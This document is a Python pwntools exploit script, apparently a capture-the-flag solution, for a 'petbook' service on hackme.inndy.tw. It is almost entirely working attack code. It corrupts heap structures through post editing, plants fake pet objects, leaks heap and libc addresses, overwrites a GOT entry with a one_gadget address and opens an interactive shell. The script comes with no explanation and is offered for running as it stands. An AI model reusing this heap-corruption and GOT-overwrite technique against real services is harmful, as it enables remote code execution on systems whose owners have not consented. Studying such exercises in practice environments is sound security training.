#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *

debug=0
if debug:
    p=process('./petbook')
    context.log_level='debug'
    gdb.attach(proc.pidof(p)[0])
    e=ELF('/lib/x86_64-linux-gnu/libc-2.24.so')
    one_gadget=0x3f2d6
else:
    context.log_level='debug'
    p=remote('hackme.inndy.tw', 7710)
    e=ELF('./libc-2.23.so.x86_64')
    one_gadget=0x45206

def se(x):
    p.sendline(x)

def ru(x):
    p.recvuntil(x)

def reg(name,pwd,line=True):
    se('1')
    ru('Username >>')
    if line:
        se(name)
    else:
        p.send(name)
    ru('Password >>')
    se(pwd)
    ru('>>')

def login(name,pwd):
    se('2')
    ru('>>')
    se(name)
    ru('>>')
    se(pwd)
    p.recvuntil('Have Pet: ')
    if p.recv(1)=='Y':
        ru('Name: ')
        name_data=p.recvuntil('\n')[:-1]
        p.recvuntil('Type: ')
        type_data=p.recvuntil('\n')[:-1]
        ru('>>')
        return name_data,type_data
    ru('>>')

def logout():
    se('0')
    ru('>>')

def new_post(title,length,content):
    se('1')
    ru('Title >>')
    se(title)
    ru('Length >>')
    se(str(length))
    ru('Content >>')
    se(content)
    ru('>>')

def edit_post(id,title,length,content):
    se('3')
    ru('id >>')
    se(str(id))
    ru('title >>')
    se(title)
    ru('size >>')
    se(str(length))
    ru('Content >>')
    se(content)
    ru('>>')


def pet_adopt(name):
    se('5')
    ru('Name')
    se(name)
    ru('>>')

def pet_rename(name):
    se('6')
    ru('>>')
    se(name)
    ru('>>')

def pet_abandon():
    se('7')

def admin_info():
    se('999')



reg('u1','u1')
login('u1','u1')
new_post('1',700,'a'*520+p64(0x603158-16))
edit_post(2,'1',1500,'a')
logout()


reg('u2','u2')
heap=login('u2','u2')
heap=u32(heap[1]+'\x00'*(4-len(heap[1])))

fake_pet=p64(0xdeadbeef)+p64(0x603164)+p64(0x603038)
pet_offset=0xf30

new_post('2',700,'a'*520+p64(heap+pet_offset))
new_post('3',700,fake_pet)
edit_post(4,'1',1500,'b')
logout()

reg('u3','u3')
data=login('u3','u3')
magic=data[0]
libc=data[1]

magic=u32(magic)
base=u64(libc+'\x00\x00')-e.symbols['puts']

fake_pet2=p64(magic+0x300000000)+p64(0x603018)+p64(0x603018)
pet_offset2=0xd80

new_post('4',700,'c'*520+p64(heap+pet_offset2))
new_post('5',60,fake_pet2)
edit_post(7,'2',1500,'c')
logout()

reg('u4','u4')
login('u4','u4')

pet_rename(p64(base+one_gadget)[:-1])
pet_abandon()

p.interactive()
